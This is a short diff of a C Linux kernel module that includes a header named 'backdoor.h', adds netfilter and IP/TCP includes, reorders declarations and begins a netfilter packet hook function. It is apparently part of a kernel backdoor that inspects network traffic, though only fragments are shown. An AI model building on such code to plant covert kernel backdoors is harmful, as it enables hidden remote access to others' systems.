@@ -1,8 +1,14 @@
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <net/esp.h>
+
 #include "backdoor.h"
 
-static struct nf_hook_ops nfho;
 unsigned char *buffer;
 unsigned long buffer_length;
+static struct nf_hook_ops nfho;
 
 unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
 	struct iphdr *ip_header;
